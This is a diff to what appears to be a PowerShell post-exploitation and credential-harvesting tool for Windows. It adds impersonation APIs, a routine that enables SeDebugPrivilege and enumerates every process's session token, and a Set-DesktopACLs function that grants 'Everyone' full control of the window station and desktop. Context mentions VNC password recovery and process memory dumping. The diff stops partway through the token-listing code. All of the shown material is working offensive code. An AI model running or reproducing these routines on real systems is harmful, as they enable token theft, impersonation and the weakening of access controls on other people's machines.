@@ -760,9 +760,9 @@ function GetSystemInfo()
 	return [WinSystemInfo]::GetSystemInfo()
 }
 
-function EnableSeDebug
+function EnablePrivilege($Privilege)
 {
-	# Enable SeDebugPrivilege (require to dump process memory). Require admin rights
+	# Enable desired privilege. Require admin rights
 	# Add Win API functions: AdjustTokenPrivileges()/OpenProcessToken()/LookupPrivilegeValue()
 	# A New function is define to set privilege on process: SetPrivilege()
 	If (-not ([System.Management.Automation.PSTypeName]'WinPriv').Type)
@@ -797,17 +797,16 @@ function EnableSeDebug
 			internal const int TOKEN_QUERY = 0x00000008;
 			internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
 
-			public static bool SetPrivilege(long processHandle, string privilege, bool disable)
+			public static bool SetPrivilege(IntPtr ProcHandle, string Privilege, bool Disable)
 			{
 				bool retVal;
+				IntPtr TokenHandle = IntPtr.Zero;
+				retVal = OpenProcessToken(ProcHandle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref TokenHandle);
+				
 				TokPriv1Luid tp;
-				IntPtr hproc = new IntPtr(processHandle);
-				IntPtr htok = IntPtr.Zero;
-				retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
 				tp.Count = 1;
 				tp.Luid = 0;
-
-				if (disable)
+				if (Disable)
 				{
 					tp.Attr = SE_PRIVILEGE_DISABLED;
 				}
@@ -816,8 +815,12 @@ function EnableSeDebug
 					tp.Attr = SE_PRIVILEGE_ENABLED;
 				}
 
-				retVal = LookupPrivilegeValue(null, privilege, ref tp.Luid);
-				retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
+				retVal = LookupPrivilegeValue(null, Privilege, ref tp.Luid);
+				if (!retVal)
+				{
+					return retVal;
+				}
+				retVal = AdjustTokenPrivileges(TokenHandle, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
 				return retVal;
 			}
 		}
@@ -825,10 +828,9 @@ function EnableSeDebug
 	}
 
 	$ProcHandle = (Get-Process -id ([System.Diagnostics.Process]::GetCurrentProcess().Id)).Handle
-	$PrivilegeEnabled = [WinPriv]::SetPrivilege($ProcHandle, "SeDebugPrivilege", $False)
+	$PrivilegeEnabled = [WinPriv]::SetPrivilege($ProcHandle, $Privilege, $False)
 	If (-not $PrivilegeEnabled)
 	{
-		Write-Host ("[-] Failed to enable SeDebugPrivilege")
 		return $False
 	}
 
@@ -854,7 +856,7 @@ function SetupBeforeDumping()
 		return $False
 	}
 
-	return EnableSeDebug
+	return (EnablePrivilege "SeDebugPrivilege")
 }
 
 <#
@@ -1066,7 +1068,7 @@ function ReadMemory($Handle, $Pages, $Addr)
 	If (($Addr -ge $Global:CachedMemory["BaseAddr"]) -and ($Addr -lt $Global:CachedMemory["EndAddr"]))
 	{
 		# Address is inside already cached memory page range -> Return cached buffer
-		
+
 		return ($Global:CachedMemory["Buff"], ($Addr - $Global:CachedMemory["BaseAddr"]), $Global:CachedMemory["BaseAddr"])
 	}
 	Else
@@ -1095,7 +1097,7 @@ function ReadMemory($Handle, $Pages, $Addr)
 					$Global:CachedMemory["Buff"] = $Buff
 					$Global:CachedMemory["BaseAddr"] = $Page["BaseAddress"]
 					$Global:CachedMemory["EndAddr"] = $Page["EndAddress"]
-					
+
 					return ($Buff, ($Addr - $Page["BaseAddress"]), $Page["BaseAddress"])
 				}
 			}
@@ -1400,6 +1402,10 @@ function LoadTokensAPI
 	# OpenProcess()/CloseHandle()/EnumProcesses()/OpenProcessToken()
 	# GetTokenInformation()/ConvertSidToStringSid()/LookupAccountSidW()
 	# DuplicateTokenEx()/GetLastError()
+	# CreateProcessWithTokenW()/SetThreadToken()
+	# ProcessIdToSessionId()/SetTokenInformation()/CreateProcessAsUserW()/ImpersonateLoggedOnUser()
+	# OpenWindowStationW()/OpenDesktopA()/GetSecurityInfo()/SetSecurityInfo()/CreateWellKnownSid()/SetEntriesInAclW()/LocalFree()
+	# LsaGetLogonSessionData()
 	If (-not ([System.Management.Automation.PSTypeName]'TokensAPI').Type)
 	{
 		Add-Type -TypeDefinition @'
@@ -1417,7 +1423,7 @@ function LoadTokensAPI
 				PROCESS_DUP_HANDLE = 0x0040,
 				ALL = 0x001F0FFF
 			}
-			
+
 			[Flags]
 			public enum TOKEN_INFORMATION_CLASS
 			{
@@ -1439,7 +1445,37 @@ function LoadTokensAPI
 				TokenAuditPolicy,
 				TokenOrigin
 			}
+
+			[StructLayout(LayoutKind.Sequential)]
+			public struct ACL
+			{
+				public byte AclRevision;
+				public byte Sbz1;
+				public Int16 AclSize;
+				public Int16 AceCount;
+				public Int16 Sbz2;
+			}
 			
+			[StructLayout(LayoutKind.Sequential)]
+			public struct TRUSTEE
+			{
+				public IntPtr pMultipleTrustee;
+				public UInt32 MultipleTrusteeOperation;
+				public UInt32 TrusteeForm;
+				public UInt32 TrusteeType;
+				public IntPtr ptstrName;
+			}
+			
+			[StructLayout(LayoutKind.Sequential)]
+			public struct EXPLICIT_ACCESS
+			{
+				public UInt32 grfAccessPermissions;
+				public UInt32 grfAccessMode;
+				public UInt32 grfInheritance;
+				public TRUSTEE Trustee;
+			}
+
+			[StructLayout(LayoutKind.Sequential)]
 			public struct TOKEN_USER
 			{
 				public SID_AND_ATTRIBUTES User;
@@ -1451,8 +1487,8 @@ function LoadTokensAPI
 
 				public IntPtr Sid;
 				public int Attributes;
-			} 
-			
+			}
+
 			[StructLayout(LayoutKind.Sequential)]
 			public struct SECURITY_ATTRIBUTES
 			{
@@ -1460,7 +1496,7 @@ function LoadTokensAPI
 				public long lpSecurityDescriptor;
 				public long bInheritHandle;
 			}
-			
+
 			public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;
 			public const UInt32 STANDARD_RIGHTS_READ = 0x00020000;
 			public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001;
@@ -1477,8 +1513,16 @@ function LoadTokensAPI
 				TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
 				TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
 				TOKEN_ADJUST_SESSIONID);
-			public const UInt32 TOKEN_MANIP_ACCESS = (TOKEN_QUERY | TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_QUERY_SOURCE | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | (131072 | 4));
-			
+			public const UInt32 ACCESS_SYSTEM_SECURITY = 0x01000000;
+			public const UInt32 READ_CONTROL = 0x00020000;
+			public const UInt32 WRITE_DAC = 0x00040000;
+			public const UInt32 DESKTOP_GENERIC_ALL = 0x000F01FF;
+			public const UInt32 DACL_SECURITY_INFORMATION = 0x4;
+			public const UInt32 TRUSTEE_IS_SID = 0x0;
+			public const UInt32 TRUSTEE_IS_WELL_KNOWN_GROUP = 0x5;
+			public const UInt32 GRANT_ACCESS = 0x1;
+			public const UInt32 OBJECT_INHERIT_ACE = 0x1;
+
 			[Flags]
 			public enum SID_NAME_USE
 			{
@@ -1492,7 +1536,7 @@ function LoadTokensAPI
 				SidTypeUnknown,
 				SidTypeComputer
 			}
-			
+
 			[Flags]
 			public enum SECURITY_IMPERSONATION_LEVEL : uint
 			{
@@ -1501,21 +1545,21 @@ function LoadTokensAPI
 				SecurityImpersonation = 2,
 				SecurityDelegation = 3
 			}
-			
+
 			[Flags]
 			public enum TOKEN_TYPE : uint
 			{
 				TokenPrimary		= 1,
 				TokenImpersonation  = 2
 			}
-			
+
 			[Flags]
 			public enum LogonFlags
 			{
 				WithProfile = 1,
 				NetCredentialsOnly
 			}
-			
+
 			[Flags]
 			public enum CreationFlags
 			{
@@ -1527,7 +1571,7 @@ function LoadTokensAPI
 				UnicodeEnvironment = 0x00000400,
 				ExtendedStartupInfoPresent = 0x00080000
 			}
-			
+
 			[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
 			public struct STARTUPINFO
 			{
@@ -1550,7 +1594,7 @@ function LoadTokensAPI
 				public IntPtr hStdOutput;
 				public IntPtr hStdError;
 			}
-			
+
 			[StructLayout(LayoutKind.Sequential)]
 			public struct PROCESS_INFORMATION
 			{
@@ -1559,14 +1603,14 @@ function LoadTokensAPI
 				public int dwProcessId;
 				public int dwThreadId;
 			}
-			
+
 			[StructLayout(LayoutKind.Sequential)]
 			public struct LUID
 			{
 				public Int32 LowPart;
 				public Int32 HighPart;
 			}
-			
+
 			[StructLayout(LayoutKind.Sequential)]
 			public struct TOKEN_STATISTICS
 			{
@@ -1581,18 +1625,70 @@ function LoadTokensAPI
 				public UInt32 PrivilegeCount;
 				public LUID ModifiedId;
 			}
+			
+			[StructLayout(LayoutKind.Sequential)]
+			public struct LSA_UNICODE_STRING
+			{
+				UInt16 Length;
+				UInt16 MaximumLength;
+				IntPtr Buffer;
+			}
+			
+			[StructLayout(LayoutKind.Sequential)]
+			public struct LARGE_INTEGER
+			{
+				Int64 QuadPart;
+			}
+			
+			[StructLayout(LayoutKind.Sequential)]
+			public struct LSA_LAST_INTER_LOGON_INFO
+			{
+				LARGE_INTEGER LastSuccessfulLogon;
+				LARGE_INTEGER LastFailedLogon;
+				UInt32 FailedAttemptCountSinceLastSuccessfulLogon;
+			}
+			
+			[StructLayout(LayoutKind.Sequential)]
+			public struct SECURITY_LOGON_SESSION_DATA
+			{
+				public UInt32 Size;
+				public LUID LoginId;
+				public LSA_UNICODE_STRING Username;
+				public LSA_UNICODE_STRING LoginDomain;
+				public LSA_UNICODE_STRING AuthenticationPackage;
+				public UInt32 LogonType;
+				public UInt32 Session;
+				public IntPtr Sid;
+				public LARGE_INTEGER LoginTime;
+				public LSA_UNICODE_STRING LoginServer;			
+				public LSA_UNICODE_STRING DnsDomainName;
+				public LSA_UNICODE_STRING Upn;
+				public UInt32 UserFlags;
+				public LSA_LAST_INTER_LOGON_INFO LastLogonInfo;
+				public LSA_UNICODE_STRING LogonScript;		
+				public LSA_UNICODE_STRING ProfilePath;
+				public LSA_UNICODE_STRING HomeDirectory;
+				public LSA_UNICODE_STRING HomeDirectoryDrive;
+				public LARGE_INTEGER LogoffTime;				
+				public LARGE_INTEGER KickOffTime;
+				public LARGE_INTEGER PasswordLastSet;
+				public LARGE_INTEGER PasswordCanChange;
+				public LARGE_INTEGER PasswordMustChange;
+			}
 
 			public const UInt32 ERROR_INSUFFICIENT_BUFFER = 122;
 			public const UInt32 ERROR_INVALID_SID = 1337;
-		
+
 			[DllImport("psapi.dll", SetLastError=true)]
 			public static extern bool EnumProcesses(UInt32[] processIds, UInt32 arraySizeBytes, ref UInt32 bytesCopied);
-			
+
 			[DllImport("kernel32.dll")]
 			public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
 			[DllImport("kernel32.dll")]
 			public static extern bool CloseHandle(IntPtr hObject);
-			
+			[DllImport("kernel32.dll")]
+			public static extern bool ProcessIdToSessionId(uint dwProcessId, ref uint pSessionId);
+
 			[DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
 			public static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
 			[DllImport("advapi32.dll", SetLastError=true)]
@@ -1600,16 +1696,40 @@ function LoadTokensAPI
 			[DllImport("advapi32", CharSet=CharSet.Auto, SetLastError=true)]
 			public static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);
 			[DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError = true)]
-			public static extern bool LookupAccountSidW(string lpSystemName, IntPtr Sid, StringBuilder lpName, ref uint cchName, StringBuilder ReferencedDomainName, ref uint cchReferencedDomainName, out SID_NAME_USE peUse);   
+			public static extern bool LookupAccountSidW(string lpSystemName, IntPtr Sid, StringBuilder lpName, ref uint cchName, StringBuilder ReferencedDomainName, ref uint cchReferencedDomainName, out SID_NAME_USE peUse);
 			[DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError=true)]
 			public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, ref SECURITY_ATTRIBUTES lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, out IntPtr phNewToken);
 			[DllImport("advapi32.dll", SetLastError = true)]
 			public static extern bool SetThreadToken(IntPtr pHandle, IntPtr hToken);
 			[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
 			public static extern bool CreateProcessWithTokenW(IntPtr hToken, LogonFlags dwLogonFlags, IntPtr lpApplicationName, IntPtr lpCommandLine, CreationFlags dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);
-		
+			[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
+			public static extern bool SetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength);
+			[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
+			public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
+			[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
+			public static extern bool CreateProcessAsUserW(IntPtr hToken, IntPtr lpApplicationName, IntPtr lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, CreationFlags dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);
+			[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
+			public static extern uint GetSecurityInfo(IntPtr handle, uint ObjectType, uint SecurityInfo, ref IntPtr ppsidOwner, ref IntPtr ppsidGroup, ref IntPtr ppDacl, ref IntPtr ppSacl, ref IntPtr ppSecurityDescriptor);
+			[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
+			public static extern uint SetSecurityInfo(IntPtr handle, uint ObjectType, uint SecurityInfo, IntPtr psidOwner, IntPtr psidGroup, IntPtr pDacl, IntPtr pSacl);
+			[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
+			public static extern bool CreateWellKnownSid(uint WellKnownSidType, IntPtr DomainSid, IntPtr pSid, ref uint cbSid);
+			[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
+			public static extern uint SetEntriesInAclW(uint cCountOfExplicitEntries, ref EXPLICIT_ACCESS pListOfExplicitEntries, IntPtr OldAcl, ref IntPtr NewAcl);
+			
+			[DllImport("User32.dll")]
+			public static extern IntPtr OpenWindowStationW(IntPtr lpszWinSta, bool fInherit, uint dwDesiredAccess);
+			[DllImport("User32.dll")]
+			public static extern IntPtr OpenDesktopA(string lpszDesktop, uint dwFlags, bool fInherit, uint dwDesiredAccess);
+
 			[DllImport("Kernel32.dll")]
 			public static extern uint GetLastError();
+			[DllImport("Kernel32.dll")]
+			public static extern IntPtr LocalFree(IntPtr hMem);
+			
+			[DllImport("Secur32.dll")]
+			public static extern uint LsaGetLogonSessionData(IntPtr LogonId, ref IntPtr ppLogonSessionData);
 		}
 '@
 	}
@@ -5337,51 +5457,181 @@ function Get-VNCPwds()
 <# Session Tokens #>
 <##################>
 
+# Change the ACL of the WindowStation and Desktop
+function Set-DesktopACLs
+{
+	# Enable SeSecurityPrivilege
+	If (-not (EnablePrivilege "SeSecurityPrivilege"))
+	{
+		Write-Host ("[-] Failed to enable SeSecurityPrivilege`n")
+		return
+	}
+
+	# Change the privilege for the current window station to allow full privilege for all users
+	$WindowStationStr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("WinSta0")
+	$hWinsta = [TokensAPI]::OpenWindowStationW($WindowStationStr, $False, [TokensAPI]::ACCESS_SYSTEM_SECURITY -bor [TokensAPI]::READ_CONTROL -bor [TokensAPI]::WRITE_DAC)
+
+	if ($hWinsta -eq [IntPtr]::Zero)
+	{
+		Write-Host ("[-] OpenWindowStationW() failed with error {0}`n" -f ([TokensAPI]::GetLastError()));
+		return $False
+	}
+
+	If (-not $(Set-DesktopACLToAllowEveryone $hWinsta)) { return }
+	$Discard = [TokensAPI]::CloseHandle($hWinsta)
+
+	# Change the privilege for the current desktop to allow full privilege for all users
+	$hDesktop = [TokensAPI]::OpenDesktopA("default", 0, $False, [TokensAPI]::DESKTOP_GENERIC_ALL -bor [TokensAPI]::WRITE_DAC)
+	if ($hDesktop -eq [IntPtr]::Zero)
+	{
+		Write-Host ("[-] OpenDesktopA() failed with error {0}`n" -f ([TokensAPI]::GetLastError()));
+		return $False
+	}
+
+	If (-not $(Set-DesktopACLToAllowEveryone $hDesktop)) { return }
+	$Discard = [TokensAPI]::CloseHandle($hDesktop)
+}
+
+function Set-DesktopACLToAllowEveryone($hObject)
+{
+	[IntPtr]$ppSidOwner = [IntPtr]::Zero
+	[IntPtr]$ppsidGroup = [IntPtr]::Zero
+	[IntPtr]$ppDacl = [IntPtr]::Zero
+	[IntPtr]$ppSacl = [IntPtr]::Zero
+	[IntPtr]$ppSecurityDescriptor = [IntPtr]::Zero
+	# 0x7 is window station, change for other types
+	$retVal = [TokensAPI]::GetSecurityInfo($hObject, 0x7, [TokensAPI]::DACL_SECURITY_INFORMATION, [Ref]$ppSidOwner, [Ref]$ppSidGroup, [Ref]$ppDacl, [Ref]$ppSacl, [Ref]$ppSecurityDescriptor)
+	if ($retVal -ne 0)
+	{
+		Write-Host ("[-] GetSecurityInfo() failed with error {0}`n" -f ($retVal));
+		return $False
+	}
+
+	if ($ppDacl -ne [IntPtr]::Zero)
+	{
+		$AclObj = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ppDacl, [Type](New-Object TokensAPI+ACL).GetType())
+
+		# Add all users to ACL
+		[UInt32]$RealSize = 2000
+		$pAllUsersSid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($RealSize)
+		$Success = [TokensAPI]::CreateWellKnownSid(1, [IntPtr]::Zero, $pAllUsersSid, [Ref]$RealSize)
+		if (-not $Success)
+		{
+			Write-Host ("[-] CreateWellKnownSid() failed with error {0}`n" -f ([TokensAPI]::GetLastError()));
+			return $False
+		}
+
+		# For user "Everyone"
+		$TrusteeSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type](New-Object TokensAPI+TRUSTEE).GetType())
+		$TrusteePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TrusteeSize)
+		$TrusteeObj = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TrusteePtr, [Type](New-Object TokensAPI+TRUSTEE).GetType())
+		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TrusteePtr)
+		$TrusteeObj.pMultipleTrustee = [IntPtr]::Zero
+		$TrusteeObj.MultipleTrusteeOperation = 0
+		$TrusteeObj.TrusteeForm = [TokensAPI]::TRUSTEE_IS_SID
+		$TrusteeObj.TrusteeType = [TokensAPI]::TRUSTEE_IS_WELL_KNOWN_GROUP
+		$TrusteeObj.ptstrName = $pAllUsersSid
+
+		# Give full permission
+		$ExplicitAccessSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type](New-Object TokensAPI+EXPLICIT_ACCESS).GetType())
+		$ExplicitAccessPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ExplicitAccessSize)
+		$ExplicitAccess = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExplicitAccessPtr, [Type](New-Object TokensAPI+EXPLICIT_ACCESS).GetType())
+		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($ExplicitAccessPtr)
+		$ExplicitAccess.grfAccessPermissions = 0xf03ff
+		$ExplicitAccess.grfAccessMode = [TokensAPI]::GRANT_ACCESS
+		$ExplicitAccess.grfInheritance = [TokensAPI]::OBJECT_INHERIT_ACE
+		$ExplicitAccess.Trustee = $TrusteeObj
+
+		[IntPtr]$NewDacl = [IntPtr]::Zero
+
+		$RetVal = [TokensAPI]::SetEntriesInAclW(1, [Ref]$ExplicitAccess, $ppDacl, [Ref]$NewDacl)
+		if ($RetVal -ne 0)
+		{
+			Write-Host ("[-] SetEntriesInAclW() failed with error {0}`n" -f ($retVal));
+			return $False
+		}
+
+		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($pAllUsersSid)
+
+		if ($NewDacl -eq [IntPtr]::Zero)
+		{
+			Write-Host ("[-] New DACL is null`n");
+			return $False
+		}
+
+		# 0x7 is window station, change for other types
+		$RetVal = [TokensAPI]::SetSecurityInfo($hObject, 0x7, [TokensAPI]::DACL_SECURITY_INFORMATION, $ppSidOwner, $ppSidGroup, $NewDacl, $ppSacl)
+		if ($RetVal -ne 0)
+		{
+			Write-Host ("[-] SetSecurityInfo() failed with error {0}`n" -f ($retVal));
+			return $False
+		}
+
+		$Discard = [TokensAPI]::LocalFree($ppSecurityDescriptor)
+		return $True
+	}
+	
+	return $False
+}
+
 function ListSessionTokens
 {
+	Write-Host ("`n[===] Listing Session Tokens [===]")
+	
 	# Load Tokens functions
 	LoadTokensAPI
-	
-	# Enable SeDebugPrivilege
-	If (-not (EnableSeDebug)) { return }
-	
-	Write-Host ("`n[===] Listing Session Tokens [===]")
-	Write-Host ("[+] Format = AuthenticationID:ProcessID:Domain:UserName:SID:TokenType")
-	
-	# Enumerate all processes
-	$ArraySize = 120
-	$ArrayBytesSize = $ArraySize * [System.Runtime.InteropServices.Marshal]::SizeOf((New-Object UInt32))
-	$ProcessIds = New-Object UInt32[] $ArraySize
-	$BytesCopied = $ArrayBytesSize
-	While ($BytesCopied -eq $ArrayBytesSize)
+
+	# Enable require privilege: SeDebugPrivilege
+	If (-not (EnablePrivilege "SeDebugPrivilege"))
 	{
-		$ArraySize += 10
-		$ArrayBytesSize = $ArraySize * [System.Runtime.InteropServices.Marshal]::SizeOf((New-Object UInt32))
-		$ProcessIds = New-Object UInt32[] $ArraySize
-		
-		$Succeeded = [TokensAPI]::EnumProcesses($ProcessIds, $ArrayBytesSize, [ref]$BytesCopied)
-		If (-not $Succeeded)
-		{
-			Write-Host ("[-] EnumProcesses() failed")
-			return
-		}
+		Write-Host ("[-] Failed to enable SeDebugPrivilege")
+		return
+	}
+
+	# Get current proccess ID and session ID
+	$CurProcID = [System.Diagnostics.Process]::GetCurrentProcess().Id
+	$CurSessionID = 0
+	$Res = [TokensAPI]::ProcessIdToSessionId($CurProcID, [ref]$CurSessionID)
+
+	# Enumerate all processes
+	$ArrayMaxProcesses = 100
+	$ArrayBytesSize = $ArrayMaxProcesses * [System.Runtime.InteropServices.Marshal]::SizeOf((New-Object UInt32))
+	$ProcessIds = New-Object UInt32[] $ArrayMaxProcesses
+	$BytesCopied = 0
+	$Succeeded = [TokensAPI]::EnumProcesses($ProcessIds, $ArrayBytesSize, [ref]$BytesCopied)
+	If (-not $Succeeded)
+	{
+		Write-Host ("[-] EnumProcesses() failed`n")
+		return
 	}
 	$NbProcesses = $BytesCopied / [System.Runtime.InteropServices.Marshal]::SizeOf((New-Object UInt32))
+
+	If ($NbProcesses -eq 0)
+	{
+		Write-Host ("[-] Failed to enumerate any process`n")
+		return
+	}
+	
+	Write-Host ("[+] Format = ProcessID:SessionID:Domain:UserName:SID:LogonID:TokenType:LogonType")
 	
 	# Open each process
 	For ($i = 0; $i -lt $NbProcesses; $i += 1)
 	{
+		# Get this process session ID
+		$SessionID = 0
+		$Res = [TokensAPI]::ProcessIdToSessionId($ProcessIds[$i], [ref]$SessionID)
+
 		$ProcHandle = [TokensAPI]::OpenProcess([TokensAPI+ProcessAccessFlags]::PROCESS_QUERY_INFORMATION, $False, $ProcessIds[$i])
 		If ($ProcHandle.ToInt64())
 		{
 			$TokenHandle = New-Object IntPtr
-			$Succeeded = [TokensAPI]::OpenProcessToken($ProcHandle, [TokensAPI]::TOKEN_MANIP_ACCESS, [ref]$TokenHandle)
+			$Succeeded = [TokensAPI]::OpenProcessToken($ProcHandle, [TokensAPI]::TOKEN_READ -bor [TokensAPI]::TOKEN_QUERY, [ref]$TokenHandle)
 			If ($Succeeded)
 			{
-				# Get token information (TokenUser and TokenStatistics)
-				
-				# Call one time to get token info struct length (TokenUser)
+				# Get token information
 				$TokenInfoLength = 0
+				
+				### TokenUser: SIDPtr to string SID ###
 				$Succeeded = [TokensAPI]::GetTokenInformation($TokenHandle, [TokensAPI+TOKEN_INFORMATION_CLASS]::TokenUser, 0, $TokenInfoLength, [ref]$TokenInfoLength)
 				If (-not $Succeeded)
 				{
@@ -5392,8 +5642,8 @@ function ListSessionTokens
 						Continue
 					}
 				}
-				
-				[IntPtr]$TokenInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenInfoLength)				
+
+				[IntPtr]$TokenInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenInfoLength)
 				$Succeeded = [TokensAPI]::GetTokenInformation($TokenHandle, [TokensAPI+TOKEN_INFORMATION_CLASS]::TokenUser, $TokenInfoPtr, $TokenInfoLength, [ref]$TokenInfoLength)
 				If (-not $Succeeded)
 				{
@@ -5402,12 +5652,24 @@ function ListSessionTokens
 					[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
 					Continue
 				}
-				
+
 				$TokenInfo = New-Object TokensAPI+TOKEN_USER
 				$Cast = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenInfoPtr, [Type]$TokenInfo.GetType())
+
 				$SIDPtr = $Cast.User.Sid
-				
-				# Call one time to get token info struct length (TokenStatistics)
+				$SIDPtrString = 0
+				$Succeeded = [TokensAPI]::ConvertSidToStringSid($SIDPtr, [ref]$SIDPtrString)
+				If (-not $Succeeded)
+				{
+					$Discard = [TokensAPI]::CloseHandle($ProcHandle)
+					$Discard = [TokensAPI]::CloseHandle($TokenHandle)
+					[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
+					Continue
+				}
+				$SID = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($SIDPtrString)
+				[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
+
+				### TokenStatistics: AuthenticationID, LogonID, TokenType ###
 				$TokenInfoLength = 0
 				$Succeeded = [TokensAPI]::GetTokenInformation($TokenHandle, [TokensAPI+TOKEN_INFORMATION_CLASS]::TokenStatistics, 0, $TokenInfoLength, [ref]$TokenInfoLength)
 				If (-not $Succeeded)
@@ -5419,8 +5681,8 @@ function ListSessionTokens
 						Continue
 					}
 				}
-				
-				[IntPtr]$TokenInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenInfoLength)				
+
+				[IntPtr]$TokenInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenInfoLength)
 				$Succeeded = [TokensAPI]::GetTokenInformation($TokenHandle, [TokensAPI+TOKEN_INFORMATION_CLASS]::TokenStatistics, $TokenInfoPtr, $TokenInfoLength, [ref]$TokenInfoLength)
 				If (-not $Succeeded)
 				{
@@ -5429,30 +5691,16 @@ function ListSessionTokens
 					[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
 					Continue
 				}
-				
+
 				$TokenInfo = New-Object TokensAPI+TOKEN_STATISTICS
 				$Cast = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenInfoPtr, [Type]$TokenInfo.GetType())
 				$LogonID = $Cast.AuthenticationId.LowPart
 				$TokenType = $Cast.TokenType
-				
-				$Succeeded = [TokensAPI]::CloseHandle($TokenHandle)
-				
-				$SIDPtrString = 0
-				$Succeeded = [TokensAPI]::ConvertSidToStringSid($SIDPtr, [ref]$SIDPtrString)
-				If (-not $Succeeded)
-				{
-					$Discard = [TokensAPI]::CloseHandle($ProcHandle)
-					$Discard = [TokensAPI]::CloseHandle($TokenHandle)
-					[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
-					Continue
-				}
-				
-				$SID = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($SIDPtrString)
-				
+
+				### SID to UserName/Domain ###
 				$cchName = 0
 				$cchReferencedDomainName = 0
 				$peUse = New-Object TokensAPI+SID_NAME_USE
-				# Call one time to get strings length
 				$Succeeded = [TokensAPI]::LookupAccountSidW($Null, $SIDPtr, $Null, [ref]$cchName, $Null, [ref]$cchReferencedDomainName, [ref]$peUse)
 				If (-not $Succeeded)
 				{
@@ -5464,7 +5712,7 @@ function ListSessionTokens
 						Continue
 					}
 				}
-				
+
 				$UserName = New-Object Text.StringBuilder $cchName
 				$Domain = New-Object Text.StringBuilder $cchReferencedDomainName
 				$Succeeded = [TokensAPI]::LookupAccountSidW($Null, $SIDPtr, $UserName, [ref]$cchName, $Domain, [ref]$cchReferencedDomainName, [ref]$peUse)
@@ -5476,64 +5724,95 @@ function ListSessionTokens
 					Continue
 				}
 				
-				Write-Host ("[+] {0}:{1}:{2}:{3}:{4}:{5}" -f ($LogonID, $ProcessIds[$i], $Domain, $UserName, $SID, $TokenType))
+				### Get LogonType ###
+				$LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type](New-Object TokensAPI+LUID).GetType()))
+				[System.Runtime.InteropServices.Marshal]::StructureToPtr($Cast.AuthenticationId, $LuidPtr, $False)
+
+				[IntPtr]$LogonSessionDataPtr = [IntPtr]::Zero
+				$ReturnVal = [TokensAPI]::LsaGetLogonSessionData($LuidPtr, [Ref]$LogonSessionDataPtr)
+				If ($ReturnVal -ne 0 -and $LogonSessionDataPtr -eq [IntPtr]::Zero)
+				{
+					Write-Host ("LsaGetLogonSessionData() failed with error {0}" -f ([TokensAPI]::GetLastError()))
+					$Discard = [TokensAPI]::CloseHandle($ProcHandle)
+					$Discard = [TokensAPI]::CloseHandle($TokenHandle)
